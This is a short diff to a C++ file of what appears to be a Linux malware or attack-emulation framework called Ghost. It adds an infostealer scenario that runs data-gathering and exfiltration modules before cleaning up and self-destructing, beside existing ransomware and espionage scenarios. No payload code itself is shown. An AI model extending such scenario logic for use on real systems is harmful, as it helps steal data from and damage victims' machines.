@@ -64,6 +64,7 @@ void Ghost::runScenario(ScenarioType type) {
             modules["EXFIL"]->execute();
             modules["IMPACT"]->execute();
             // TODO: leave a ransom note
+            // ransomware typically changes the wallpaper, but since it's a linux, it'll probably get complex with all possible DE and stuff
             break;
         #endif
         #ifdef SCENARIO_ESPIONAGE
@@ -88,6 +89,16 @@ void Ghost::runScenario(ScenarioType type) {
             cleanup();
             destroy();
             exit(0);    // this WILL break the system if used with mode other than TEST, so we just kill the module instantly on success
+        #endif
+        #ifdef SCENARIO_INFOSTEALER
+        case ScenarioType::INFOSTEALER:
+            LOG_INFO("[SCENARIO] Executing infostealer")
+
+            modules["GATHER"]->execute();
+            modules["EXFIL"]->execute();
+
+            cleanup();
+            destroy();
         #endif
         default:
             LOG_ERROR("No valid scenario detected")
